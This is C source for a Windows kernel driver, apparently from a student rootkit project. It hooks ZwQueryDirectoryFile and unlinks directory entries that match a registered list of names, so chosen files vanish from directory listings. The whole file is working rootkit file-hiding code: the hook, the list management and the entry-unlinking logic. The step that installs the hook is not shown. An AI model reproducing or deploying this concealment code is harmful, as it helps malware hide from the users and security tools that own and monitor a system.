/*
** File		hide_file.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		HideFile function find 
** 			and hide file passed as parameter
*/

#include <ntifs.h>
#include "driver.h"
#include "hide_file.h"

t_fileToHide			*gToHideList = NULL;

pZwQueryDirectoryFile 	gZwQueryDirectoryFileAddress = NULL;

t_fileInfoClassType		classTypeTab[] = {
	{
		FileDirectoryInformation,
		FILENAME_OFFSET(PFILE_DIRECTORY_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_DIRECTORY_INFORMATION)
	},
	{
		FileFullDirectoryInformation,
		FILENAME_OFFSET(PFILE_FULL_DIR_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_FULL_DIR_INFORMATION)
	},
	{
		FileBothDirectoryInformation,
		FILENAME_OFFSET(PFILE_BOTH_DIR_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_BOTH_DIR_INFORMATION)
	},
	{
		FileNamesInformation,
		FILENAME_OFFSET(PFILE_NAMES_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_NAMES_INFORMATION)
	},
	{
		FileIdBothDirectoryInformation,
		FILENAME_OFFSET(PFILE_ID_BOTH_DIR_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_ID_BOTH_DIR_INFORMATION)
	},
	{
		FileIdFullDirectoryInformation,
		FILENAME_OFFSET(PFILE_ID_FULL_DIR_INFORMATION),
		FILENAMESIZE_OFFSET(PFILE_ID_FULL_DIR_INFORMATION)
	},
	{0, 0, 0}
};

NTSTATUS 		ZwQueryDirectoryFileHook(
					IN HANDLE FileHandle,
					IN HANDLE Event OPTIONAL,
					IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
					IN PVOID ApcContext OPTIONAL,
					OUT PIO_STATUS_BLOCK IoStatusBlock,
					OUT PVOID FileInformation,
					IN ULONG FileInformationLength,
					IN FILE_INFORMATION_CLASS FileInformationClass,
					IN BOOLEAN ReturnSingleEntry,
					IN PUNICODE_STRING FileName OPTIONAL,
					IN BOOLEAN RestartScan)
{
	NTSTATUS	ret;

	ret = ((pZwQueryDirectoryFile) (gZwQueryDirectoryFileAddress))(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		FileInformationLength,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);
	if(!NT_SUCCESS(ret))
		return (ret);
	UnlinkFilesToHide(
		FileInformation,
		FileInformationClass);
	return (ret);
}

NTSTATUS			HideFile(IN PCHAR params)
{
	t_fileToHide 	*newFile;
	UNICODE_STRING	uFileName;
	ANSI_STRING		cFileName;
	ULONG			i;
	SIZE_T			size;

	RtlInitAnsiString(&cFileName, params);
	RtlAnsiStringToUnicodeString(&uFileName, &cFileName, TRUE);
	size = (strlen(params) + 1) * sizeof(WCHAR);
	
	newFile = (t_fileToHide *) ExAllocatePoolWithTag(
		PagedPool,
		sizeof(t_fileToHide),
		666);
	if (newFile)
	{
		newFile->fileName = (PWCHAR) ExAllocatePoolWithTag(
			PagedPool,
			size,
			666);
		if (newFile->fileName)
		{
			newFile->next = gToHideList;
			gToHideList = newFile;
			memcpy(newFile->fileName, uFileName.Buffer, size);
			return (STATUS_SUCCESS);
		}
	}
	return (STATUS_UNSUCCESSFUL);
}

VOID				UnlinkFilesToHide(
						IN PVOID FileInformation,
						IN FILE_INFORMATION_CLASS FileInformationClass)
{
	PWCHAR			FileNamePtr;
	PULONG			FileNameLength;
	ULONG			NameOffset;
	ULONG			NameSizeOffset;
	PBYTE			curr;
	PBYTE			prev;
	PULONG 			DeltaCurr;
	PULONG			DeltaPrev;
	t_fileToHide 	*fileToHide = gToHideList;

	while (fileToHide)
	{
		prev = NULL;
		curr = FileInformation;
		GetNameInfo(curr, FileInformationClass, &NameOffset, &NameSizeOffset);
		while (curr)
		{
			DeltaCurr = (PULONG) curr;
			DeltaPrev = (PULONG) prev;

			FileNamePtr = (PWCHAR) ((PBYTE) curr + NameOffset);
			FileNameLength = (PULONG) ((PBYTE) curr + NameSizeOffset);
		
			if (FileNamePtr != NULL
				&& *FileNameLength == wcslen(fileToHide->fileName) * 2
				&& memcmp(
					FileNamePtr,
					fileToHide->fileName,
					(SIZE_T) *FileNameLength) == 0)
			{
				if (prev == NULL)
				{
					if (*DeltaCurr)
						(PBYTE) FileInformation += *DeltaCurr;
					else
						FileInformation = NULL;
				}
				else
				{
					if (*DeltaCurr)
						*DeltaPrev += *DeltaCurr;
					else
						*DeltaPrev = 0;
				}
			}
			else
				prev = curr;
			if (*DeltaCurr)
				curr += *DeltaCurr;
			else
				curr = NULL;
		}
		fileToHide = fileToHide->next;
	}
}

VOID		GetNameInfo(
				IN PVOID FileInformation,
				IN FILE_INFORMATION_CLASS FileInformationClass,
				OUT PULONG NameOffset,
				OUT PULONG NameSizeOffset)
{
	ULONG	i;
	
	*NameOffset = 0;
	*NameSizeOffset = 0;
	for (i = 0; classTypeTab[i].fileInfoClass != 0; i++)
	{
		if (classTypeTab[i].fileInfoClass == FileInformationClass)
		{
			*NameOffset = classTypeTab[i].NameOffset;
			*NameSizeOffset = classTypeTab[i].NameSizeOffset;
			return;
		}
	}
}
